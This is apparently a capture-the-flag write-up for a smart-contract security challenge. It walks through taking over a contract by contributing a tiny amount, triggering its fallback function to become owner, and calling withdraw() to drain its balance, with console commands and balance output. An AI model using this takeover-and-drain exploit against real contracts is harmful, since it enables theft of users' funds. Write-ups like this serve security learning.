Owner gets changed in one of two functions: contribute() and (fallback).

Approach 1:
Idea is to call contribute() to make myself have more contribution than the owner’s contribution. But owner has 1000 ETH, and there is no way we can get that much ETH and outcompete the owner!!

Approach 2:
Call the fallback function. In order to do that we need to first increase my contribution to above 0:
  await contract.contribute({value: toWei(0.0009) });
Now it will pass the require check in (fallback), so we can trigger the (fallback) by sending ETH to the contract:
  await contract.send(toWei(0.01));

To verify changed owner: 
await contract.owner()
"0x6ba166580bd6989f2cad8b5245d269b845694baf"

Now, empty all of contract’s balance to my account:
Check current contract balance:
await getBalance("0xcf8932c6b0444e9ae118156a83181171c11a4c2d")
"0.0109"

My current balance: 
await getBalance("0x6ba166580bD6989F2CAD8b5245d269B845694BAf")
"41.9848995867"

contract.withdraw()

await getBalance("0xcf8932c6b0444e9ae118156a83181171c11a4c2d")
"0"

await getBalance("0x6ba166580bD6989F2CAD8b5245d269B845694BAf")
"41.9957667176"

